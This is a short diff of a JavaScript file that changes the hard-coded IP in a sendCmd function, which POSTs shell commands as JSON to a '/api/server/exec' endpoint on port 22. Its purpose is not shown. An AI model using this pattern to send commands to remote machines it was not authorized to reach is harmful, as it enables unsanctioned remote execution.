@@ -19,7 +19,7 @@ console.log(`Total Chunks: ${chunks.length}`);
 function sendCmd(cmd, callback) {
     const payload = JSON.stringify({ cmd: cmd });
     const req = http.request({
-        hostname: '115.135.158.84',
+        hostname: '175.142.51.75',
         port: 22,
         path: '/api/server/exec',
         method: 'POST',
